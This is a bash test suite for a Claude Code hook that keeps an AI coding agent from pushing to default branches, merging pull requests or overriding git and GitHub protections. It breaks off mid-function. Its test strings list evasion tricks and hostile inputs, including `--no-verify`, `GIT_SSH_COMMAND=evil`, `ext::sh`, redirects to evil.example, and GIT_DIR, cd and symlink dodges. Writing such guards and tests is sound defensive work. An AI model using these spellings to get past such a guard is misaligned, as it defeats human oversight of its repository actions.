#!/bin/bash

# Behavior suite for src/user/claude_code/hooks/git-gh-guard-hook.sh.
#
# Wired into CI: `.github/workflows/vorpal.yaml` enumerates test files by name.
#
# THE PROPERTY UNDER TEST: every git and gh command is allowed except a push
# to a default branch, a pull request merge, and an override of a git or
# GitHub permission that exists outside the sandbox; and a git that would run
# outside the sandbox (`git push`, a bare `git fetch` or `git ls-remote`, and
# the pull, clone, remote update, worktree, upstream, config set and
# submodule forms the sandbox excludes) is allowed only in a form and a
# repository the hook can vouch for.
#
# DEFECT CLASS. Two failure directions:
#   FALSE ALLOW - an excepted action through a spelling the hook does not
#     fold: a quoted or path-qualified command name, a refspec form, a gh api
#     endpoint or GraphQL mutation, a command substitution, a wrapper.
#   FALSE DENY  - ordinary git and gh work refused: a commit whose message
#     names a blocked flag, a read through gh api, a throwaway repository, a
#     command that only mentions git or gh as text.
#
# SEAM. The hook reads stdin JSON, the repository the JSON's cwd names, and
# `gh api repos/<owner>/<repo>` for the default branch. The suite builds real
# repositories under a temp directory and puts a stub `gh` first on PATH, so
# no row touches the network or the runner's credentials.

set -uo pipefail

SCRIPT_DIR=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
REPO_ROOT=$(cd "${SCRIPT_DIR}/.." && pwd)
HOOK="${GUARD_HOOK:-${REPO_ROOT}/src/user/claude_code/hooks/git-gh-guard-hook.sh}"

PASS=0
FAIL=0

fail() {
    printf 'FAIL: %s\n' "$1" >&2
    FAIL=$((FAIL + 1))
}

pass() {
    printf 'PASS: %s\n' "$1"
    PASS=$((PASS + 1))
}

fatal() {
    printf 'FATAL: %s\n' "$1" >&2
    exit 2
}

[ -f "$HOOK" ] || fatal "hook not found at ${HOOK}"
command -v jq >/dev/null 2>&1 || fatal "jq is required to run this test"
command -v git >/dev/null 2>&1 || fatal "git is required to run this test"

BASH_BIN=$(command -v bash) || fatal "bash not found on PATH"

WORK=$(mktemp -d "${TMPDIR:-/tmp}/git-gh-guard.XXXXXX") || fatal "mktemp failed"
trap 'rm -rf "$WORK"' EXIT

# Git reads no config but the repositories' own.
export GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null GIT_CONFIG_NOSYSTEM=1
unset GIT_CONFIG_COUNT GIT_DIR GIT_WORK_TREE

# ---- fixtures -----------------------------------------------------------------

PROJ="$WORK/proj"   # the session's project: origin -> github.com acme/widgets
OTHER="$WORK/other" # a different repository
SCRATCH="$WORK/scratch"
NOTREPO="$WORK/plain"
STUB="$WORK/bin"
CACHE="$WORK/cache"
GH_LOG="$WORK/gh.log"

make_repo() {
    git init -q "$1" || fatal "git init $1 failed"
    git -C "$1" remote add origin "$2" || fatal "remote add failed"
}

make_repo "$PROJ" git@github.com:acme/widgets.git
make_repo "$OTHER" git@github.com:acme/widgets.git
make_repo "$SCRATCH" "$WORK/nowhere.git"
mkdir -p "$NOTREPO" "$STUB" "$PROJ/sub"

# The stub answers the default-branch lookup: `trunk` for acme/widgets, so a
# default other than main and master is exercised.
cat >"$STUB/gh" <<EOF
#!/bin/bash
printf '%s\n' "\$*" >>"$GH_LOG"
case "\$*" in
    "api repos/acme/widgets --jq .default_branch") echo trunk ;;
    "api repos/acme/fork --jq .default_branch") echo develop ;;
    "api repos/acme/slow --jq .default_branch") sleep 6; echo trunk ;;
    *) exit 1 ;;
esac
EOF
chmod +x "$STUB/gh"

CWD="$PROJ"
PROJECT="$PROJ"
REASON=''

# run_hook <command>: sets VERDICT (ALLOW, DENY, or ERROR:<rc>) and REASON.
run_hook() {
    local input rc
    input=$(jq -nc --arg c "$1" --arg d "$CWD" \
        '{hook_event_name:"PreToolUse",tool_name:"Bash",tool_input:{command:$c},cwd:$d}')
    REASON=$(PATH="$STUB:$PATH" CLAUDE_PROJECT_DIR="$PROJECT" GIT_GH_GUARD_CACHE_DIR="$CACHE" \
        GIT_GH_GUARD_BOUND_SECONDS="${BOUND:-30}" \
        "$BASH_BIN" "$HOOK" 2>&1 >/dev/null <<<"$input")
    rc=$?
    case $rc in
        0) VERDICT=ALLOW ;;
        2) VERDICT=DENY ;;
        *) VERDICT="ERROR:$rc" ;;
    esac
}

allow() {
    run_hook "$1"
    if [ "$VERDICT" = ALLOW ]; then
        pass "allow: $1"
    else
        fail "want ALLOW, got ${VERDICT}: $1 -- ${REASON}"
    fi
}

# block <command> [<text the reason must carry>]
block() {
    run_hook "$1"
    if [ "$VERDICT" != DENY ]; then
        fail "want DENY, got ${VERDICT}: $1"
    elif [ -n "${2:-}" ] && [[ $REASON != *"$2"* ]]; then
        fail "DENY without '${2}' in the reason: $1 -- ${REASON}"
    else
        pass "deny: $1"
    fi
}

# ---- commands that are not git or gh --------------------------------------------

case_unrelated_commands_pass() {
    allow 'ls -la'
    allow 'cargo test --locked'
    allow 'echo "git push origin main"'
    allow "rg 'gh pr merge' docs"
    allow 'printf "%s\n" high light digit'
    allow 'cat .github/workflows/vorpal.yaml'
    allow '# gh pr merge 5'
    allow 'echo done # then git push origin main'
    local input
    input=$(jq -nc '{hook_event_name:"PreToolUse",tool_name:"Read",tool_input:{file_path:"git push origin main"},cwd:"/"}')
    if PATH="$STUB:$PATH" "$BASH_BIN" "$HOOK" >/dev/null 2>&1 <<<"$input"; then
        pass "allow: a non-Bash tool"
    else
        fail "a non-Bash tool got a verdict"
    fi
}

# ---- exception 1: a push to a default branch ---------------------------------------

case_push_to_another_branch_is_allowed() {
    allow 'git push -u origin feat/x'
    allow 'git push origin feat'
    allow 'git push --force-with-lease origin feat'
    allow 'git push --force-with-lease=feat:abc123 origin feat'
    allow 'git push -f origin feat'
    allow 'git push -uf origin feat'
    allow 'git push origin HEAD:feat'
    allow 'git push origin HEAD:refs/heads/feat'
    allow 'git push origin feat:refs/heads/feat2'
    allow 'git push origin feat 2>&1'
    allow 'git push origin feat >/dev/null 2>&1'
    allow 'git push origin --delete feat'
    allow 'git push origin :feat'
    allow 'git push origin tag v1.0.0'
    allow 'git push --tags origin'
    allow 'git push origin feat refs/tags/v1'
    allow 'git --no-pager push origin feat'
    allow 'timeout 60 git push origin feat'
    allow 'git push origin origin/main'
    allow 'git push origin mainline'
}

case_push_to_a_default_branch_is_denied() {
    block 'git push origin main' 'default branch'
    block 'git push origin master' 'default branch'
    block 'git push origin trunk' 'default branch'
    block 'git push origin Main' 'default branch'
    block 'git push origin HEAD:main' 'default branch'
    block 'git push origin feat:refs/heads/main' 'default branch'
    block 'git push origin feat:heads/main' 'default branch'
    block 'git push origin +feat:main' 'default branch'
    block 'git push origin :main' 'default branch'
    block 'git push origin --delete main' 'default branch'
    block 'git push -d origin trunk' 'default branch'
    block 'git push -f origin main' 'default branch'
    block 'git push origin feat feat2 main' 'default branch'
    block "g'i't push origin main" 'default branch'
    block '/usr/bin/git push origin main' 'default branch'
    block 'command git push origin main' 'default branch'
    block '=git push origin main' 'default branch'
    block 'git push origin refs/heads/main' 'default branch'
}

case_push_with_an_unreadable_destination_is_denied() {
    block 'git push' 'name the remote'
    block 'git push origin' 'name the branch'
    block 'git push -u origin HEAD' 'destination branch literally'
    block 'git push origin @' 'destination branch literally'
    block 'git push --all origin'
    block 'git push --mirror origin'
    block 'git push --branches origin'
    block 'git push --prune origin feat'
    block 'git push origin "$BRANCH"' 'plain literal'
    block 'git push origin $(git branch --show-current)'
    block 'git push origin `git branch --show-current`'
    block "git push origin 'refs/heads/*'"
    block 'git push origin feat:refs/for/main' 'outside refs/heads'
    block 'git push --repo=origin feat'
    block 'git push --receive-pack=evil origin feat'
    block 'git push --exec=evil origin feat'
    block 'git push -o ci.skip origin feat'
    block 'git push --recurse-submodules=on-demand origin feat'
    block 'git push --no-verify origin feat' 'pre-push hook'
    block 'git push https://github.com/acme/widgets.git feat' 'not a configured remote'
    block 'git push ../other feat' 'not a configured remote'
    block 'git push nosuch feat' 'not a configured remote'
    block 'git push origin feat > out.txt' 'redirection'
}

case_push_inside_a_compound_is_denied() {
    block 'git push origin feat && echo done' 'own Bash call'
    block 'git add -A && git commit -m x && git push origin feat' 'own Bash call'
    block 'cd sub && git push origin feat' 'own Bash call'
    block 'git push origin feat | tail -5' 'own Bash call'
    block 'echo $(git push origin feat)' 'own Bash call'
    block '(git push origin feat)'
    block 'if true; then git push origin feat; fi' 'own Bash call'
    block 'X=1; git push origin feat' 'own Bash call'
}

case_push_with_a_rerouting_prefix_is_denied() {
    block 'git -C . push origin feat' 'git option before the subcommand'
    block 'git -c core.sshCommand=evil push origin feat'
    block 'git --git-dir=.git push origin feat'
    block 'GIT_SSH_COMMAND=evil git push origin feat' 'environment assignment'
    block 'SSH_AUTH_SOCK=/tmp/x git push origin feat' 'environment assignment'
}

case_push_from_an_unvouched_repository_is_denied() {
    CWD="$OTHER"
    block 'git push origin feat' 'different repository'
    CWD="$NOTREPO"
    block 'git push origin feat' 'not inside a git repository'
    CWD="$PROJ/sub"
    allow 'git push origin feat'
    CWD="$PROJ"

    PROJECT="$NOTREPO"
    block 'git push origin feat' 'project directory is not a git repository'
    PROJECT="$PROJ"

    git -C "$PROJ" config core.sshCommand 'ssh -i /tmp/key'
    block 'git push origin feat' 'core.sshcommand'
    git -C "$PROJ" config --unset core.sshCommand

    git -C "$PROJ" config url.git@evil.example:.insteadOf git@github.com:
    block 'git push origin feat'
    git -C "$PROJ" config --remove-section url.git@evil.example:

    git -C "$PROJ" config core.hooksPath "$WORK/hooks"
    block 'git push origin feat'
    git -C "$PROJ" config --unset core.hooksPath

    printf '#!/bin/sh\n' >"$PROJ/.git/hooks/pre-push"
    block 'git push origin feat' 'pre-push'
    block 'git fetch origin' 'pre-push'
    rm -f "$PROJ/.git/hooks/pre-push"

    git -C "$PROJ" remote set-url origin git@gitlab.com:acme/widgets.git
    block 'git push origin feat' 'not a github.com repository'
    git -C "$PROJ" remote set-url origin "$WORK/nowhere.git"
    block 'git push origin feat' 'not a github.com repository'
    git -C "$PROJ" remote set-url origin https://github.com/acme/widgets
    allow 'git push origin feat'
    git -C "$PROJ" remote set-url origin ssh://git@github.com/acme/widgets.git
    allow 'git push origin feat'
    git -C "$PROJ" remote set-url origin git@github.com:acme/widgets.git
}

case_default_branch_comes_from_github_and_is_cached() {
    git -C "$PROJ" remote add fork git@github.com:acme/fork.git
    allow 'git push fork feat'
    block 'git push fork develop' 'default branch'
    allow 'git push origin develop'
    git -C "$PROJ" remote remove fork

    # An unreadable default branch blocks the push.
    git -C "$PROJ" remote add broken git@github.com:acme/broken.git
    block 'git push broken feat' 'could not read the default branch'
    block 'git push broken main' 'default branch'
    git -C "$PROJ" remote remove broken

    # A second lookup of the same repository is answered from the cache.
    rm -rf "$CACHE"
    : >"$GH_LOG"
    allow 'git push origin feat'
    allow 'git push origin feat2'
    local calls
    calls=$(grep -c 'repos/acme/widgets' "$GH_LOG")
    if [ "$calls" = 1 ]; then
        pass "the default branch is looked up once and cached"
    else
        fail "want 1 lookup of acme/widgets, got ${calls}"
    fi
}

case_wall_clock_bound_denies() {
    git -C "$PROJ" remote add slow git@github.com:acme/slow.git
    BOUND=1
    block 'git push slow feat' 'wall-clock bound'
    unset BOUND
    git -C "$PROJ" remote remove slow
}

# ---- fetch and ls-remote ----------------------------------------------------------

case_fetch_and_ls_remote() {
    allow 'git fetch'
    allow 'git fetch origin'
    allow 'git fetch origin main'
    allow 'git fetch --prune --tags origin'
    allow 'git fetch --all'
    allow 'git fetch --depth=1 origin feat'
    allow "git fetch origin '+refs/heads/*:refs/remotes/origin/*'"
    allow 'git ls-remote --heads origin'
    allow 'git ls-remote origin'
    allow 'git ls-remote https://github.com/acme/widgets.git'
    allow 'git fetch https://github.com/acme/widgets.git main'
    block 'git fetch --upload-pack=evil origin' 'allowlist'
    block 'git ls-remote --upload-pack=evil origin' 'allowlist'
    block 'git fetch ../other' 'not a configured remote'
    block 'git fetch ext::sh' 'not a configured remote'
    block "git fetch 'ext::sh -c evil'" 'characters'
    block 'git ls-remote https://evil.example.com/x/y.git' 'not a configured remote'
    block 'git fetch origin "$B"' 'plain literal'
    block 'git -C ../other fetch origin' 'git option before the subcommand'
    block 'git fetch --recurse-submodules origin' 'allowlist'
    # Beside a command that is not excluded the fetch stays sandboxed; beside
    # only excluded commands the whole call may leave, so the fetch is checked.
    allow 'git fetch origin && git rebase origin/main'
    allow 'cd ../other && git fetch'
    allow 'ls && git fetch ../other'
    block 'gh pr view 5 && git fetch ../other' 'not a configured remote'
    block 'git status; git ls-remote https://evil.example.com/x/y.git' 'not a configured remote'
    block 'if gh pr view 5; then git fetch ../other; fi' 'not a configured remote'

    printf '[submodule "x"]\n\tpath = x\n\turl = https://example.com/x\n' >"$PROJ/.gitmodules"
    block 'git fetch origin' 'submodules'
    allow 'git fetch --no-recurse-submodules origin'
    allow 'git ls-remote origin'
    rm -f "$PROJ/.gitmodules"

    git -C "$PROJ" remote add local "$WORK/nowhere.git"
    block 'git fetch' 'not a github.com repository'
    block 'git fetch --all' 'not a github.com repository'
    allow 'git fetch origin'
    git -C "$PROJ" remote remove local
}

# ---- exception 3 on git that stays in the sandbox -----------------------------------

case_ordinary_git_is_allowed() {
    allow 'git status'
    allow 'git add -A && git commit -m "feat: add the guard"'
    allow 'git commit -m "docs: explain --no-verify and --no-gpg-sign"'
    allow 'git commit -m "it'"'"'s a `quoted` word"'
    allow 'git commit -s -m x'
    allow 'git commit -am "x"'
    allow 'git -C sub status'
    allow 'git log --oneline | head -5'
    allow 'git diff main...HEAD'
    allow 'git rebase origin/main'
    allow 'git merge --no-ff feat'
    allow 'git merge -n feat'
    allow 'git config user.name "A B"'
    allow 'git config --get remote.origin.url'
    allow 'git config core.hooksPath'
    allow 'git config get commit.gpgsign'
    allow 'git config --list'
    allow 'git config "branch.$b.description" text'
    allow 'git remote -v'
    allow 'git remote show origin'
    allow 'git branch -D feat'
    allow 'git checkout -b feat'
    allow 'git stash push -u -m tag'
    allow 'git worktree list'
    allow 'git --version'
    allow 'git'
    allow 'git commit -m "$(cat <<'"'"'EOF'"'"'
feat: a message

It mentions gh pr merge and `git push origin main` as text.
EOF
)"'
}

case_git_permission_overrides_are_denied() {
    block 'git commit --no-verify -m x' 'hooks'
    block 'git commit -n -m x' 'hooks'
    block 'git commit -nm x' 'hooks'
    block 'git commit -anm x' 'hooks'
    block 'git commit -m x --no-verify' 'hooks'
    block 'git merge --no-verify feat' 'hooks'
    block 'git commit --no-gpg-sign -m x' 'signature'
    block 'git rebase --no-gpg-sign main' 'signature'
    block 'git commit-tree --no-gpg-sign -m x 4b825dc642cb6eb9a060e54bf8d69288fbee4904' 'signature'
    allow 'git commit-tree -S -m x 4b825dc642cb6eb9a060e54bf8d69288fbee4904'
    # Real git commands outside the everyday set are known, not aliases.
    allow 'git upload-archive --help'
    allow 'git http-fetch --help'
    block 'git -c commit.gpgsign=false commit -m x'
    block 'git -c core.hooksPath=/dev/null commit -m x'
    block 'git -c "$KV" commit -m x'
    block 'git --config-env=core.sshCommand=X status'
    block 'git config core.hooksPath /dev/null'
    block 'git config --global credential.helper store'
    block 'git config set commit.gpgsign false'
    block 'git config --unset commit.gpgsign'
    block 'git config --add url.https://x/.insteadOf git@github.com:'
    block 'git config alias.p "push origin main"'
    block 'git config "remote.$R.pushurl" x'
    block 'git config "$KEY" value'
    block 'git config --remove-section credential'
    block 'git config --edit'
    block 'git remote set-url origin git@github.com:evil/x.git' 'pushes and fetches'
    block 'git remote add fork git@github.com:evil/x.git' 'pushes and fetches'
    block 'git remote remove origin' 'pushes and fetches'
    block 'git credential fill' 'credentials'
    block 'git credential-osxkeychain get' 'credentials'
    block 'git send-pack origin main' 'push plumbing'
    block 'git mypush' 'alias or an external'
    block 'git $SUB origin main' 'subcommand is an expansion'
    block 'GIT_CONFIG_GLOBAL=/dev/null git commit -m x'
    block 'GIT_SSH_COMMAND=evil git pull'
    block 'export GIT_SSH_COMMAND=evil; git pull'
    block 'cd "$DIR" && git config commit.gpgsign false'
}

case_scratch_repositories_are_exempt() {
    allow "git -C $SCRATCH -c commit.gpgsign=false commit -m x"
    allow "git -C $SCRATCH commit --no-verify -m x"
    allow "git -C $SCRATCH config commit.gpgsign false"
    allow "git -C $SCRATCH remote add up $WORK/nowhere.git"
    # The shell's `cd` is never followed: it can fail, be skipped, be
    # redefined or run in another shell. The git command names the scratch
    # repository itself, which git obeys wherever the shell stands.
    block "cd $SCRATCH && git config commit.gpgsign false" 'not followed'
    block "cd $SCRATCH && git remote add up $WORK/nowhere.git"
    allow "cd $PROJ/sub && git -C $SCRATCH commit --no-verify -m x"
    allow "cd /nonexistent; git -C $SCRATCH commit --no-verify -m x"
    block "cd $SCRATCH && git -C . commit --no-verify -m x"
    # The repository is read as it stands when the call starts, so a
    # directory the call itself makes is not followed: a `git worktree add`
    # earlier in the call could make it a checkout of the project.
    block "git -C $WORK/not-yet-made config commit.gpgsign false" 'exists before the call'
    CWD="$NOTREPO"
    block 'git init new && git -C new config commit.gpgsign false'
    block 'git init new && cd new && git config commit.gpgsign false'
    git init -q "$NOTREPO/made" || fatal "fixture init failed"
    block 'git -C made config commit.gpgsign false' 'absolute dir'
    allow "git -C $NOTREPO/made config commit.gpgsign false"
    allow "git -C $NOTREPO/made commit --no-verify -m x"
    allow "git -C $NOTREPO/made log | head; git -C $NOTREPO/made commit --no-verify -m x"
    allow "git -C $NOTREPO/made -C . commit --no-verify -m x"
    block "git -C $NOTREPO/made -C $PROJ commit --no-verify -m x"
    block "git -C $NOTREPO/made -C ../../proj commit --no-verify -m x"
    allow "(git -C $NOTREPO/made commit --no-verify -m x)"
    allow "git -C $NOTREPO/made/.git/.. commit --no-verify -m x"
    block 'cd made && git config commit.gpgsign false'
    block 'cd made; git commit --no-verify -m x'
    block 'pushd made && git commit --no-verify -m x'
    block 'cd made && git log | head; git commit --no-verify -m x'
    block 'cd made && (git commit --no-verify -m x)'
    rm -rf "$NOTREPO/made"
    # The directory a call starts in is not followed either: a wrapper, a
    # function or a sourced file can move the shell with no `cd` word.
    CWD="$SCRATCH"
    block 'git commit --no-gpg-sign -m x'
    allow "git -C $SCRATCH commit --no-gpg-sign -m x"
    block 'git log | head; git commit --no-verify -m x'
    block 'git -C . commit --no-verify -m x'
    block "uv run --directory $PROJ git commit --no-verify -m x"
    block "env -C $PROJ git commit --no-verify -m x"
    block "eval cd $PROJ; git commit --no-verify -m x"
    block "trap 'cd $PROJ' DEBUG; git commit --no-verify -m x"
    block "x=cd; \$x $PROJ; git commit --no-verify -m x"
    block "source ./go-to-project.sh; git commit --no-verify -m x"
    CWD="$PROJ"
    # A `cd` that cannot run, or runs elsewhere, leaves the shell in the
    # project.
    block "cd $SCRATCH > /nonexistent-dir/out; git commit --no-verify -m x"
    block "cd -q $SCRATCH; git commit --no-verify -m x"
    block 'cd -- -P; git commit --no-verify -m x'
    block "cd $SCRATCH"$'\r\n''git commit --no-verify -m x'$'\r\n'
    block "cd $SCRATCH && true & git commit --no-verify -m x"
    block 'cd() { echo hi; }; git commit --no-verify -m x'
    block "HOME=$SCRATCH; git -C ~ commit --no-verify -m x"
    block "git -C ~ commit --no-verify -m x"
    # A variable that moves the repository git reads, however it is exported
    # and wherever it stands among the prefixes.
    block "GIT_DIR=$PROJ/.git; declare -x GIT_DIR; git -C $SCRATCH commit --no-verify -m x"
    block "GIT_SSH_COMMAND=/x GIT_DIR=$PROJ/.git git -C $SCRATCH commit -m x"
    block "export GIT_DIR=$PROJ/.git; HUSKY=0 git -C $SCRATCH commit -m x"
    block "GIT_WORK_TREE=$PROJ; git -C $SCRATCH commit --no-verify -m x"
    block "read GIT_DIR <<<$PROJ/.git; export GIT_DIR; git -C $SCRATCH commit --no-verify -m x"
    block "printf -v GIT_DIR %s $PROJ/.git; export GIT_DIR; git -C $SCRATCH commit --no-verify -m x"
    # A scratch verdict does not loosen a write to config outside the
    # repository at hand.
    block "git -C $SCRATCH config --global core.hooksPath /x" 'outside the repository'
    block "git -C $SCRATCH config --glob core.hooksPath /x"
    block "git -C $SCRATCH config --system core.hooksPath /x"
    block "git -C $SCRATCH config -f$PROJ/.git/config core.hooksPath /x"
    block "git -C $SCRATCH config --fil $PROJ/.git/config core.hooksPath /x"
    allow "git -C $SCRATCH config --global --get core.hooksPath"
    # A brace list is several words to the shell and one to this hook.
    block 'git commit {--no-verify,-m} x' 'brace list'
    block 'git commit {--no-verify,--allow-empty,-m} x'
    block "git -C $SCRATCH -c {user.name=x,--git-dir=$PROJ/.git} commit --no-verify -m x" 'brace list'
    block 'gh pr {merge,view} 5'
    allow 'git stash apply stash@{0}'
    allow 'git log HEAD@{1}..HEAD'
    allow 'gh api repos/{owner}/{repo}/pulls'
    # A variable set under a computed name can be one that moves the
    # repository, and a wrapper can add or replace words.
    block "P=GIT_; export \${P}DIR=$PROJ/.git; git -C $SCRATCH commit --no-verify -m x"
    block "n=GIT_; read \${n}DIR <<<$PROJ/.git; git -C $SCRATCH commit --no-verify -m x"
    block "printf -v \"\${n}DIR\" %s $PROJ/.git; git -C $SCRATCH commit --no-verify -m x"
    block "eval \"\$setup\"; git -C $SCRATCH commit --no-verify -m x"
    block "env \"\$V=$PROJ/.git\" git -C $SCRATCH commit --no-verify -m x"
    block "echo $PROJ | xargs -I $SCRATCH git -C $SCRATCH commit --no-verify -m x"
    block "echo --file $PROJ/.git/config core.hooksPath /x | xargs git -C $SCRATCH config"
    block "command git -C $SCRATCH commit --no-verify -m x"
    allow "printf '%s\\n' \"\$x\"; git -C $SCRATCH commit --no-verify -m x"
    # A config file named in a spelling the hook does not read, named
    # twice, or reached through a link.
    block "git -C $SCRATCH config -zf $PROJ/.git/config core.hooksPath /x"
    block "git config --file $WORK/x --file .git/config core.hooksPath /x"
    ln -s "$PROJ/.git/config" "$WORK/cfglnk"
    block "git config --file $WORK/cfglnk core.hooksPath /x" 'symbolic link'
    rm -f "$WORK/cfglnk"
    # A lookup that fails for any reason but "not a git repository" proves
    # nothing about the directory.
    printf '#!/bin/sh\necho "fatal: unknown repository format" >&2\nexit 128\n' >"$STUB/git"
    chmod +x "$STUB/git"
    CWD="$NOTREPO"
    block "git -C $NOTREPO commit --no-verify -m x"
    block "git -C $NOTREPO config core.hooksPath /dev/null"
    rm -f "$STUB/git"
    allow "git -C $NOTREPO config core.hooksPath /dev/null"
    CWD="$PROJ"
    # A git directory whose parts are links writes into another repository.
    git init -q "$WORK/wd" || fatal "fixture init failed"
    allow "git -C $WORK/wd config core.hooksPath /dev/null"
    rm -f "$WORK/wd/.git/config"
    ln -s "$PROJ/.git/config" "$WORK/wd/.git/config"
    block "git -C $WORK/wd config core.hooksPath /dev/null"
    block "git -C $WORK/wd remote add up $WORK/nowhere.git"
    rm -rf "$WORK/wd"
    git init -q "$WORK/wd" || fatal "fixture init failed"
    rm -rf "$WORK/wd/.git/hooks"
    ln -s "$PROJ/.git/hooks" "$WORK/wd/.git/hooks"
    block "git -C $WORK/wd commit --no-verify -m x"
    rm -rf "$WORK/wd"
    # A linked worktree of the project under a temp root is the project.
    git -C "$PROJ" commit -q --allow-empty -m seed 2>/dev/null
    if git -C "$PROJ" worktree add -q "$WORK/wt" -b wt-probe 2>/dev/null; then
        block "git -C $WORK/wt commit --no-verify -m x"
        git -C "$PROJ" worktree remove --force "$WORK/wt"
        git -C "$PROJ" branch -q -D wt-probe
    fi
    # The project itself is under a temp root in this suite and is still real.
    block "git -C $PROJ commit --no-verify -m x"
    block "git -C $PROJ/sub config commit.gpgsign false"
    # The shell resolves `cd <link>/..` textually and stays in the project,
    # so the link's physical parent does not make the call a scratch one.
    mkdir -p "$SCRATCH/d"
    ln -s "$SCRATCH/d" "$PROJ/lnk"
    block 'cd lnk/.. && git push --force origin trunk'
    block 'cd lnk/.. && git commit --no-verify -m x'
    block 'cd lnk/.. && git -c core.hooksPath=/dev/null commit -m x'
    # A call may mix plain `cd`, `cd -P` and `git -C`, which read a `..`
    # after a link differently, so the readings must agree after every word.
    mkdir -p "$PROJ/real/x" "$PROJ/real/n" "$SCRATCH/t" "$SCRATCH/m"
    ln -s "$PROJ/real/x" "$PROJ/m"
    ln -s "$SCRATCH/t" "$PROJ/n"
    ln -s "$SCRATCH/t" "$SCRATCH/n"
    block 'cd lnk/.. && git -C m/../n commit --no-verify -m x'
    block 'cd lnk/.. && cd -P m/../n && git commit --no-verify -m x'
    block 'cd lnk/.. && git -C m/../n -c core.hooksPath=/dev/null commit -m x'
    rm -rf "$PROJ/m" "$PROJ/n" "$PROJ/real" "$SCRATCH/n" "$SCRATCH/t" "$SCRATCH/m"
    # A `cd` that fails leaves the shell in the project.
    block "cd $SCRATCH/not-made; git commit --no-verify -m x"
    block "cd $SCRATCH/d/../not-made && git commit --no-verify -m x"
    # zsh stack and substitution forms of `cd` name no directory to follow.
    block "pushd $SCRATCH && cd +1 && git commit --no-verify -m x"
    block "pushd $SCRATCH && pushd && git commit --no-verify -m x"
    block "cd proj scratch && git commit --no-verify -m x"
    # Wherever a `cd` stands in the call, it is not followed: after the git
    # command, after another command, in a subshell, a pipeline, a
    # background job or an `||` list, or behind a keyword.
    block "git commit --no-verify -m x; cd $SCRATCH"
    block "git commit --no-verify -m x && cd $SCRATCH"
    block "git commit --no-verify -m x; (cd $SCRATCH)"
    block "git commit --no-verify -m x; pushd $SCRATCH"
    block "git -C sub commit --no-verify -m x; cd $SCRATCH"
    block "true && cd $SCRATCH; git commit --no-verify -m x"
    block "(cd $SCRATCH); git commit --no-verify -m x"
    block "cd $SCRATCH & git commit --no-verify -m x"
    block "cd $SCRATCH | git commit --no-verify -m x"
    block "cd $SCRATCH || git commit --no-verify -m x"
    block "if cd $SCRATCH; then :; fi; git commit --no-verify -m x"
    block "builtin cd $SCRATCH; git commit --no-verify -m x"
    block "cd -s $SCRATCH; git commit --no-verify -m x"
    block "chdir $SCRATCH/not-made; git commit --no-verify -m x"
    # A word the shell expands is not a directory name to follow.
    block "cd $SCRATCH && cd ~- && git commit --no-verify -m x"
    block "cd $SCRATCH && git -C ~- commit --no-verify -m x"
    block "git -C $WORK/scr* commit --no-verify -m x"
    block "cd $WORK/scr* && git commit --no-verify -m x"
    block "cd '~'; git commit --no-verify -m x"
    # A `..` that pops a symbolic link is read two ways by `cd`, `cd -P`
    # and `git -C`, whatever comes after it.
    mkdir -p "$PROJ/r" "$SCRATCH/r" "$SCRATCH/z/y"
    ln -s "$PROJ/sub" "$SCRATCH/lnk2"
    ln -s "$SCRATCH/z/y" "$PROJ/sub/q"
    block "cd -P $SCRATCH/lnk2 && cd q/../../r && git commit --no-verify -m x"
    rm -rf "$PROJ/r" "$SCRATCH/r" "$SCRATCH/z" "$SCRATCH/lnk2" "$PROJ/sub/q"
    mkdir -p "$SCRATCH/a/b" "$SCRATCH/a/u" "$SCRATCH/k/j/i" "$SCRATCH/k/pl"
    ln -s "$SCRATCH/a/b" "$PROJ/lnk3"
    ln -s "$SCRATCH/k/j/i" "$SCRATCH/a/u/q"
    ln -s "$PROJ" "$SCRATCH/a/pl"
    block 'cd lnk3/../u && cd q/../../pl && git commit --no-verify -m x'
    rm -rf "$PROJ/lnk3" "$SCRATCH/a" "$SCRATCH/k"
    # From a scratch directory a `cd ..` leaves it by a name this hook does
    # not know, so the call counts as real.
    CWD="$SCRATCH/d"
    block 'cd .. && git commit --no-verify -m x'
    block 'git -C .. commit --no-verify -m x'
    allow "git -C $SCRATCH/d/.. commit --no-verify -m x"
    CWD="$PROJ"
    rm -f "$PROJ/lnk"
}

# ---- exception 2: merging a pull request ---------------------------------------------

case_merge_is_denied_in_every_position() {
    block 'gh pr merge 5' 'merging a pull request'
    block 'gh pr merge 5 --squash'
    block 'gh pr merge 5 --auto --squash'
    block 'gh pr merge 5 --admin'
    block 'gh pr merge'
    block 'gh pr merge "$N" --disable-auto'
    block 'gh pr merge 5 --disable-auto --squash'
    block 'true && gh pr merge 5'
    block 'gh pr view 5; gh pr merge 5 --squash'
    block 'gh pr view 5 | gh pr merge 5'
    block 'echo $(gh pr merge 5)'
    block 'OUT=$(gh pr merge 5 --squash)'
    block 'echo "`gh pr merge 5`"'
    block 'if gh pr checks 5; then gh pr merge 5; fi'
    block "g'h' pr merge 5"
    block '/opt/homebrew/bin/gh pr merge 5'
    block 'command gh pr merge 5'
    block 'xargs gh pr merge'
    # A git or gh command written out behind a computed command word is
    # read as the command that runs.
    block 'env "$V" gh pr merge 5' 'merging a pull request'
    block 'env "$V=x" gh pr merge 5'
    block '$retry gh pr merge 5'
    block '"$SUDO" gh pr merge 5 --admin'
    block 'timeout "$T" gh pr merge 5'
    block 'env "$V=x" git commit --no-verify -m x'
    allow '"$BIN" gh pr view 5'
    allow '$X git status'
    allow '"$EDITOR" notes-about-gh.md'
    block 'time gh pr merge 5'
    block 'NO_COLOR=1 gh pr merge 5'
    block 'f() { gh pr merge "$@"; }; f 5'
    block 'gh pr merge 5 --body --help'
    allow 'gh pr merge 5 --disable-auto'
    allow 'gh pr merge --help'
    block 'cat <<EOF
$(gh pr merge 5)
EOF' 'heredoc'
    allow 'cat <<'"'"'EOF'"'"' > notes.md
run gh pr merge 5 when ready
EOF'
}

case_merge_through_the_api_is_denied() {
    block 'gh api -X PUT repos/acme/widgets/pulls/5/merge' 'merges a pull request'
    block 'gh api -XPUT repos/acme/widgets/pulls/5/merge'
    block 'gh api --method=PUT /repos/acme/widgets/pulls/5/merge'
    block 'gh api --method PUT "repos/$O/$R/pulls/$N/merge"'
    block 'gh api -X PUT https://api.github.com/repos/acme/widgets/pulls/5/merge'
    block 'gh api -X PUT repos/{owner}/{repo}/pulls/5/merge'
    block 'gh api repos/acme/widgets/merges -f base=main -f head=feat'
    block 'gh api -X POST repos/acme/widgets/merge-upstream -f branch=main'
